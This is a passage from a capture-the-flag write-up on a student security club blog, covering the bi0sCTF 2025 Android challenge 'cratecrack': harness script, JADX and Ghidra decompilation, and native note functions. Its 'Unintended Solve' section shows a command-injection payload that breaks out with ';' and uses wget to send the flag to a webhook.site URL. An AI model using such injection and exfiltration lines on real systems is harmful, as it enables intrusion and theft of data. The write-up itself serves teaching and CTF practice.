@@ -1,0 +1,309 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>cratecrack</title><meta content=cratecrack name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/cratecrack/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=cratecrack property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/cratecrack/ property=twitter:url><meta content=cratecrack property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/cratecrack/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>cratecrack</span></div><time datetime=2025-07-08>Published on: <span class=accent-data>2025-07-08</span></time><address rel=author>By <span class=accent-data> Hargun Kaur, and exploiitm </span></address><h1>cratecrack</h1><p>Special mention to <a href=https://ctftime.org/writeup/40314 rel=noopener target=_blank>this writeup</a> by <a href=https://ctftime.org/user/161414 rel=noopener target=_blank>s41nt0l3xus</a> from team <a href=https://ctftime.org/team/270230 rel=noopener target=_blank>LCD</a>.<h3 id=what-we-re-given>What We’re Given</h3><p>The handout.zip contains an APK file, a python script, a couple of files for a Docker setup, and a placeholder flag.<h3 id=the-python-script>The Python Script</h3><p>Let’s begin by going through script.py.<p>For the PoW, we used Baby-Step Giant-Step algorithm to solve the discrete logarithm problem g^x ≡ target (mod p) for x in the range [0, max_x).<pre style=background:#282828;color:#fdf4c1aa><code><span>from math import isqrt
+</span><span>from collections import defaultdict
+</span><span>
+</span><span>def bsgs(g, target, p, max_x):
+</span><span>    m = isqrt(max_x) + 1
+</span><span>    baby_steps = {}
+</span><span>
+</span><span>    # Baby step: g^j mod p
+</span><span>    current = 1
+</span><span>    for j in range(m):
+</span><span>        if current not in baby_steps:
+</span><span>            baby_steps[current] = j
+</span><span>        current = (current * g) % p
+</span><span>
+</span><span>    # Compute g^(-m) mod p
+</span><span>    g_inv = pow(g, -m, p)  # modular inverse
+</span><span>    current = target
+</span><span>
+</span><span>    # Giant step: target * g^(-im)
+</span><span>    for i in range(m):
+</span><span>        if current in baby_steps:
+</span><span>            return i * m + baby_steps[current]
+</span><span>        current = (current * g_inv) % p
+</span><span>
+</span><span>    return None
+</span></code></pre><p>The script configures environment variables for the Android tools.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>adb_port </span><span style=color:#fe8019>= </span><span style=color:#d3869b>11000
+</span><span>emu_port </span><span style=color:#fe8019>= </span><span style=color:#d3869b>11001
+</span><span>home </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"/home/user"
+</span><span>apk_path </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"/chall/app.apk"
+</span><span>
+</span><span style=color:#fdf4c1>ENV </span><span style=color:#fe8019>= </span><span>{}
+</span><span>output </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#b8bb26>"This playlist is so bad, my ears filed a complaint."</span><span>, </span><span style=color:#b8bb26>"If silence had a score, this would still rank lower"</span><span>, </span><span style=color:#b8bb26>"Okay, one decent song. Did you add it by accident?"</span><span>]
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>set_ENV</span><span>(</span><span style=color:#fdf4c1>env</span><span>):
+</span><span>    </span><span style=color:#fdf4c1>env.update(os.environ)
+</span><span>    </span><span style=color:#fdf4c1>env.update({
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_ADB_SERVER_PORT" </span><span style=color:#fdf4c1>: </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{adb_port}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_SERIAL"</span><span style=color:#fdf4c1>: </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"emulator-</span><span style=color:#fdf4c1>{emu_port}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_SDK_ROOT"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"/opt/android/sdk"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_SDK_HOME"</span><span style=color:#fdf4c1>: home,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_PREFS_ROOT"</span><span style=color:#fdf4c1>: home,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_EMULATOR_HOME"</span><span style=color:#fdf4c1>: </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{home}</span><span style=color:#b8bb26>/.android"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"ANDROID_AVD_HOME"</span><span style=color:#fdf4c1>: </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{home}</span><span style=color:#b8bb26>/.android/avd"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"JAVA_HOME"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"/usr/lib/jvm/java-17-openjdk-amd64"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"PATH"</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>"/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>os.environ.get(</span><span style=color:#b8bb26>"PATH"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>    })
+</span></code></pre><p>An AVD (Android Virtual Device) is created and an emulator is started.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>set_EMULATOR</span><span>():
+</span><span>    </span><span style=color:#fdf4c1>subprocess.call(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"avdmanager" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" create avd" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" --name 'Pixel_4_XL'" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" --abi 'default/x86_64'" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" --package 'system-images;android-30;default;x86_64'" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" --device pixel_4_xl" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" --force"</span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" > /dev/null 2> /dev/null"</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>ENV,close_fds</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>,shell</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>subprocess.Popen(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"emulator" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -avd Pixel_4_XL" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-cache" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-snapstorage" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-snapshot-save" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-snapshot-load" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-audio" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-window" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-snapshot" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -no-boot-anim" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -wipe-data" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -accel on" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -netdelay none" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -netspeed full" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -delay-adb" </span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" -port </span><span style=color:#fdf4c1>{}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>.format(emu_port)</span><span style=color:#fe8019>+
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>" > /dev/null 2> /dev/null "</span><span style=color:#fdf4c1>,
+</span><span style=color:#fdf4c1>        env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>ENV,close_fds</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>,shell</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>)
+</span></code></pre><p>We won’t get into the details of this set up, but we will save it for later use since these shell commands will help us run Android on our own.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>ADB_Helper</span><span>(</span><span style=color:#fdf4c1>args</span><span>,</span><span style=color:#fdf4c1>var1</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>subprocess.run(</span><span style=color:#b8bb26>"adb </span><span style=color:#fdf4c1>{}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>.format(</span><span style=color:#b8bb26>" "</span><span style=color:#fdf4c1>.join(args)),env</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>ENV,shell</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>,close_fds</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>,capture_output</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>var1)</span><span>.stdout
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>install_apk</span><span>():
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"install"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"-r"</span><span style=color:#fdf4c1>,apk_path])
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>start_activity</span><span>():
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"shell"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"am"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"start"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"-n"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"bi0sctf.challenge/.MainActivity"</span><span style=color:#fdf4c1>])
+</span><span>
+</span><span style=font-style:italic;color:#928374># def start_broadcast(action,extras=None):
+</span><span style=font-style:italic;color:#928374>#     ADB_Helper(["shell", "am", "broadcast", "-a", action, '--es', 'url',extras['url']])
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>send_url</span><span>(</span><span style=color:#fdf4c1>extras</span><span style=color:#fe8019>=</span><span style=color:#d3869b>None</span><span>):
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"shell"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"am"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"start"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"-n"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"bi0sctf.challenge/.MainActivity"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"--es"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"url"</span><span style=color:#fdf4c1>,extras[</span><span style=color:#b8bb26>'url'</span><span style=color:#fdf4c1>]])
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>print_adb_logs</span><span>():
+</span><span>     logs </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"logcat"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"-d"</span><span style=color:#fdf4c1>])
+</span><span>     </span><span style=color:#fa5c4b>for </span><span>log </span><span style=color:#fa5c4b>in </span><span style=color:#fdf4c1>logs.decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>).strip().split(</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>         </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(log)
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>push_file</span><span>():
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"root"</span><span style=color:#fdf4c1>])
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"push"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"/chall/flag"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>"/data/data/bi0sctf.challenge/"</span><span style=color:#fdf4c1>])
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"unroot"</span><span style=color:#fdf4c1>])
+</span></code></pre><p>These are helper functions for ADB (Android Debug Bridge) which is a command-line tool that lets us communicate with the emulated device.<p>Finally, the main logic:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>try</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>set_ENV(ENV)
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"+-------------------=============-------------------+"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"+------------------ Playlist Checker ---------------+"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"+-------------------=============-------------------+"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"[+] Waking up the bot to analyze your secret playlist..."</span><span style=color:#fdf4c1>)
+</span><span>    emulator </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>set_EMULATOR()
+</span><span>    </span><span style=font-style:italic;color:#928374>#print_adb_logs()
+</span><span>    </span><span style=color:#fdf4c1>ADB_Helper([</span><span style=color:#b8bb26>"wait-for-device"</span><span style=color:#fdf4c1>])
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"[+] Stats: Recommended over 100 playlists today."</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>install_apk()
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"[+] Status: Starting the analysing engine."</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>start_activity()
+</span><span>    </span><span style=color:#fdf4c1>push_file()
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>time.sleep(</span><span style=color:#d3869b>5</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"[+] Enter your Playlist URL to analyze: "</span><span style=color:#fdf4c1>)
+</span><span>    input_url </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>sys.stdin.readline().strip()
+</span><span>    </span><span style=font-style:italic;color:#928374># start_broadcast("bi0sctf.android.DATA", extras = {"url": input_url})
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>send_url(extras</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{</span><span style=color:#b8bb26>'url'</span><span style=color:#fdf4c1>:input_url})
+</span><span>
+</span><span>    reply </span><span style=color:#fe8019>= </span><span>output[</span><span style=color:#fdf4c1>randint(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>]
+</span><span>    </span><span style=color:#fdf4c1>print_prompt(</span><span style=color:#b8bb26>"[+] Opinion: " </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>reply)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>time.sleep(</span><span style=color:#d3869b>10</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>os.system(</span><span style=color:#b8bb26>"kill -9 `pgrep qemu`"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>emulator.kill()
+</span><span style=color:#fa5c4b>except</span><span>:
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"nice try kid"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>os.system(</span><span style=color:#b8bb26>"kill -9 `pgrep qemu`"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>os.system(</span><span style=color:#b8bb26>"kill -9 `pgrep adb`"</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fdf4c1>emulator.kill()
+</span></code></pre><p>The script starts the emulator and installs the APK file on the virtual device. The application runs and accepts the url input from the user.<h3 id=unintended-solve>Unintended Solve</h3><p>Notice the OS command injection vulnerability via the unsanitised input for user-controlled url parameter. We can exploit shell=True in subprocess.run() by injecting ; to run extra commands.<p>Payload:<ul><li><code>; cd /chall</code></ul><p>Break out of the original command Change directory to where the flag is stored<ul><li><code>wget "https://webhook.site/... ?message=$(...)”</code></ul><p>Sending flag as an HTTP request parameter to a controlled webhook.site URL. Command substitution executes below command and replaces itself with the flag text in the command line<ul><li><code>LC_ALL=C grep -r 'bi0sctf{'</code></ul><p>Find lines containing <code>bi0sctf{}</code><p>For the sake of the writeup and our understanding, let’s move forward with the intended solution.<h3 id=decompiling-apk>Decompiling APK</h3><p>We can look into app.apk using a tool like <a href=https://github.com/skylot/jadx rel=noopener target=_blank>JADX</a>.<h3 id=mainactivity>MainActivity</h3><p>As per the ADB helper functions used in the main logic of script.py, <code>bi0sctf.challenge.MainActivity</code> seems to be the entry point of the application. Let’s begin there.<pre class=language-java data-lang=java style=background:#282828;color:#fdf4c1aa><code class=language-java data-lang=java><span style=color:#fa5c4b>package </span><span style=color:#8ec07c>bi0sctf.challenge</span><span>;
+</span><span>
+</span><span style=color:#fa5c4b>import </span><span style=color:#fabd2f>android</span><span>.</span><span style=color:#fabd2f>os</span><span>.</span><span style=color:#8ec07c>Bundle</span><span>;
+</span><span style=color:#fa5c4b>import </span><span style=color:#fabd2f>android</span><span>.</span><span style=color:#fabd2f>webkit</span><span>.</span><span style=color:#8ec07c>JavascriptInterface</span><span>;
+</span><span style=color:#fa5c4b>import </span><span style=color:#fabd2f>androidx</span><span>.</span><span style=color:#fabd2f>appcompat</span><span>.</span><span style=color:#fabd2f>app</span><span>.</span><span style=color:#8ec07c>AppCompatActivity</span><span>;
+</span><span>
+</span><span style=font-style:italic;color:#928374>/* loaded from: classes.dex */
+</span><span style=color:#fa5c4b>public class </span><span style=color:#8ec07c>MainActivity </span><span style=color:#fa5c4b>extends </span><span style=color:#8ec07c>AppCompatActivity </span><span>{
+</span><span>    </span><span style=color:#fa5c4b>public native long </span><span style=color:#8ec07c>addNote</span><span>(</span><span style=color:#fa5c4b>byte[] </span><span style=color:#fdf4c1>bArr</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native void </span><span style=color:#8ec07c>deleteNote</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>j</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native void </span><span style=color:#8ec07c>edit</span><span>(</span><span style=color:#fa5c4b>byte[] </span><span style=color:#fdf4c1>bArr</span><span>, </span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>j</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native void </span><span style=color:#8ec07c>encryption</span><span>();
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native </span><span style=color:#8ec07c>String getContent</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>j</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native </span><span style=color:#8ec07c>String getId</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>j</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>public native void </span><span style=color:#8ec07c>whiplash</span><span>(</span><span style=color:#8ec07c>MainActivity </span><span style=color:#fdf4c1>mainActivity</span><span>);
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>static </span><span>{
+</span><span>        </span><span style=color:#8ec07c>System</span><span>.</span><span style=color:#fdf4c1>loadLibrary(</span><span style=color:#b8bb26>"supernova"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>        </span><span style=color:#8ec07c>System</span><span>.</span><span style=color:#fdf4c1>loadLibrary(</span><span style=color:#b8bb26>"bob"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    }
+</span></code></pre><p>Methods marked as <code>native</code> are implemented in native (x86_64) code via shared libraries. For example, there are two native libraries loaded here - <code>bob</code> and <code>supernova</code>.<pre class=language-java data-lang=java style=background:#282828;color:#fdf4c1aa><code class=language-java data-lang=java><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public long </span><span style=color:#fdf4c1>secure_addNote(</span><span style=color:#fa5c4b>byte[]</span><span style=color:#fdf4c1> bArr) </span><span>{
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>addNote(bArr)</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public</span><span> void </span><span style=color:#fdf4c1>secure_deleteNote(</span><span style=color:#fa5c4b>long</span><span style=color:#fdf4c1> j) </span><span>{
+</span><span>        </span><span style=color:#fdf4c1>deleteNote(j)</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public</span><span> void </span><span style=color:#fdf4c1>secure_edit(</span><span style=color:#fa5c4b>byte[]</span><span style=color:#fdf4c1> bArr, </span><span style=color:#fa5c4b>long</span><span style=color:#fdf4c1> j) </span><span>{
+</span><span>        </span><span style=color:#fdf4c1>edit(bArr, j)</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public </span><span style=color:#8ec07c>String </span><span style=color:#fdf4c1>secure_getContent(</span><span style=color:#fa5c4b>long</span><span style=color:#fdf4c1> j) </span><span>{
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>getContent(j)</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public </span><span style=color:#8ec07c>String </span><span style=color:#fdf4c1>secure_getId(</span><span style=color:#fa5c4b>long</span><span style=color:#fdf4c1> j) </span><span>{
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>getId(j)</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>JavascriptInterface
+</span><span>    </span><span style=color:#fa5c4b>public</span><span> void </span><span style=color:#fdf4c1>secure_encryption() </span><span>{
+</span><span>        </span><span style=color:#fdf4c1>encryption()</span><span>;
+</span><span>    }
+</span><span>
+</span><span>    @</span><span style=color:#fdf4c1>Override </span><span style=font-style:italic;color:#928374>// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+</span><span>    </span><span style=color:#fa5c4b>protected</span><span> void </span><span style=color:#fdf4c1>onCreate(</span><span style=color:#8ec07c>Bundle</span><span style=color:#fdf4c1> bundle) </span><span>{
+</span><span>        </span><span style=color:#fdf4c1>super</span><span>.</span><span style=color:#fdf4c1>onCreate(bundle)</span><span>;
+</span><span>        </span><span style=color:#fdf4c1>whiplash(this)</span><span>;
+</span><span>    }
+</span><span style=background:#932b1e;color:#fdf4c1>}</span><span>
+</span></code></pre><p>Since the application processes URLs, we can assume that the methods marked with <code>@JavascriptInterface</code> can be triggered by JavaScript on a web page loaded from our URL.<p>The native method <code>whiplash</code> seems to handle the app’s startup logic, as we find out in the next section.<p>We can now look at the native libraries in the Ghidra decompiler to search for functions implementing native Java methods.<h3 id=libbob>libbob</h3><p>This is implemented in native Rust, using JNI calls. <code>Java_bi0sctf_challenge_MainActivity_whiplash</code> is the only native method in this library.<ul><li>It gets the Activity’s Intent.<li>Extracts the “url” extra from the Intent.<li>Sets the layout (setContentView).<li>Finds a WebView by ID.<li>Enables JavaScript and sets cache mode.<li>Adds a JavascriptInterface object. Registering a JavaScript bridge called “aespa”<li>Sets WebViewClient and WebChromeClient.<li>Loads the URL into the WebView.</ul><h3 id=libsupernova>libsupernova</h3><p>The supernova library contains the native methods for a note management system which were mentioned earlier in the MainActivity.<h4 id=addnote>addNote</h4><p>Let’s begin with the <code>addNote</code> method.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>Java_bi0sctf_challenge_MainActivity_addNote
+</span><span>               (</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>param_1</span><span>,undefined8 </span><span style=color:#fdf4c1>param_2</span><span>,undefined8 </span><span style=color:#fdf4c1>param_3</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>note_bytes;
+</span><span>  </span><span style=color:#fabd2f>size_t</span><span> note_len;
+</span><span>  undefined8 note;
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> new_size;
+</span><span>  
+</span><span>  new_size </span><span style=color:#fe8019>= -</span><span style=color:#d3869b>1</span><span>;
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(noteBook_size </span><span style=color:#fe8019>!= </span><span style=color:#d3869b>10</span><span>) {
+</span><span>    note_bytes </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fa5c4b>char </span><span style=color:#fe8019>*</span><span>)(</span><span style=color:#fe8019>**</span><span>(code </span><span style=color:#fe8019>**</span><span>)(</span><span style=color:#fe8019>*</span><span>param_1 </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x5c0</span><span>))(param_1,param_3,</span><span style=color:#d3869b>0</span><span>);
+</span><span>    note_len </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>strlen</span><span style=color:#fdf4c1>(note_bytes)</span><span>;
